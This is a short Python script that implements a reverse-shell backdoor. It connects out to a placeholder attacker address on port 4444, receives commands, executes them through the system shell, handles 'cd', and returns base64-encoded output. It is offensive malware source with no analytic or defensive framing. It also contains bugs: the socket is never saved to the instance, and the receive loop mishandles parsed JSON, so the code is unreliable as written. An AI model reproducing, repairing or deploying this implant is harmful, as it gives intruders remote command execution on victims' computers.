import base64
import os
import socket
import json
import subprocess


class Backdoor:

    def __init__(self, ip, port):
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((ip, port))
        except:
            print("[-] Socket Connection failed.")


    def receive(self):
        json_result = ''
        while True:
            try:
                json_result += json.loads(self.conn.recv(1024).decode())
                return json_result
            except:
                continue


    def send(self, data):
        data = base64.b64encode(data)
        json_data = json.dumps(data.decode())
        self.conn.send(json_data.encode())


    def execute_remote_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except Exception:
            return b"[-] failed to execute command."


    def change_working_directory(self, command):
        try:
            os.chdir(command.split(' ')[1])
            return b"[+] Directory Changed"
        except Exception:
            return b"[-] Failed to change directory"


    def run(self):
        while True:
            try:
                data = self.receive()
                if(data.split(' ')[0]) == 'cd':
                    result = self.change_working_directory(data)
                else:
                    result = self.execute_remote_command(data)
                print(result)
                self.send(result)
            except KeyboardInterrupt:
                exit(0)


backdoor = Backdoor("attacker's IP", 4444)
backdoor.run()